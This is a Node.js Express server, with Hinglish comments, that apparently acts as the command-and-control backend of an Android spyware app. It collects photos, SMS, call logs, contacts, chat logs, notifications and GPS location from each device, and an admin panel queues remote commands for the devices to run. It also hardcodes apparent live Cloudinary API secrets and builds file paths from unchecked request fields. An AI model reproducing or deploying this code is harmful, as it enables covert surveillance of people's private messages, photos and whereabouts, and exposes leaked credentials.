const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. CLOUDINARY CONFIG (Tumhari Keys) ---
cloudinary.config({
  cloud_name: 'dxnh5vuik',
  api_key: '185953318184881',
  api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));

// Limits badha di hain (Heavy HD photos ke liye zaroori hai)
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage)
let devicesStatus = {}; 

// --- 3. ROOT ROUTE ---
app.get('/', (req, res) => {
    res.send('✅ Server is Running Successfully with HD Cloudinary Gallery!');
});

// ==================================================
//  GALLERY SYSTEM (UPDATED FOR HD & PAGINATION)
// ==================================================

// A. PHOTO UPLOAD (Android -> Cloudinary)
// Ye route tumhare naye 'GalleryUploader.java' se connect karega
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;

    if (!device_id || !image_data) {
        return res.status(400).json({ error: "No Data Received" });
    }

    const id = device_id.toString().trim().toUpperCase();

    // Base64 Prefix Fix (Agar app ne nahi bheja to hum laga denge)
    let base64Image = image_data;
    if (!base64Image.startsWith('data:image')) {
        base64Image = "data:image/jpeg;base64," + image_data;
    }

    // Upload to Cloudinary (HD SETTINGS)
    cloudinary.uploader.upload(base64Image, 
        { 
            folder: id,             // Device ID ka folder banega
            public_id: Date.now().toString(), // Time ke hisab se naam (Sorting ke liye)
            resource_type: "image",
            width: 1280,            // ✅ HD Width (Clear Text & Faces)
            quality: "auto",        // ✅ Auto Best Quality
            fetch_format: "auto"    // ✅ WebP/JPG auto convert (Fast loading)
        },
        function(error, result) {
            if (error) {
                console.error("❌ Cloudinary Upload Error:", error);
                return res.status(500).json({ error: "Upload Failed" });
            }
            console.log(`📸 [GALLERY] HD Photo Saved for ${id} -> ${result.secure_url}`);
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// B. GALLERY LIST (Website -> Cloudinary)
// Ye route "Load More" button ke liye data dega
app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null; // Pagination ke liye

    // Cloudinary se photos mangwana
    cloudinary.api.resources({
        type: 'upload',
        prefix: id + "/",      // Sirf is device ki photos
        max_results: 20,       // ✅ Ek baar mein 20 photos (Load More logic)
        next_cursor: next_cursor, 
        direction: 'desc',     // ✅ Newest First (Sabse nayi photo sabse upar)
        context: true
    }, 
    function(error, result) {
        if (error) {
            console.error("Cloudinary Fetch Error:", error);
            // Agar folder nahi mila ya error aaya to empty list bhejo
            return res.json({ photos: [], next_cursor: null });
        }

        // Sirf URLs nikal kar bhejo
        const photos = result.resources.map(img => img.secure_url);
        
        res.json({ 
            photos: photos, 
            next_cursor: result.next_cursor // Ye token agli 20 photos ke liye hai
        });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS
// ==================================================

// Get All Devices
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// Single Device Status
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    if (!device) return res.json({ id: id, isOnline: false });
    
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// PHONE PING (Connection & Commands)
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // Command Check
        let pendingCommand = "none";
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; // Command bhej diya, ab clear kar do
        }

        // Update RAM Data
        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };

        if(pendingCommand !== "none") {
            console.log(`📡 [PING] ${id} Command Sent: ${pendingCommand}`);
        }

        res.json({ status: "success", command: pendingCommand });

    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// Send Command (Admin Panel se)
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 [ADMIN] Sending Command '${command}' to Device ${id}`);
    
    res.json({ status: "success", command: command });
});

// ==================================================
//  DATA STORAGE (SMS, Logs, Location)
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // Location Update in Memory
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
        }
        
        // Append Mode (Logs history maintain karne ke liye)
        if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            
            // Naya data upar, purana neeche (Max 2000 records)
            const finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id}`);
        } 
        else {
            // Overwrite Mode (Location etc)
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// Get Data for Website
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
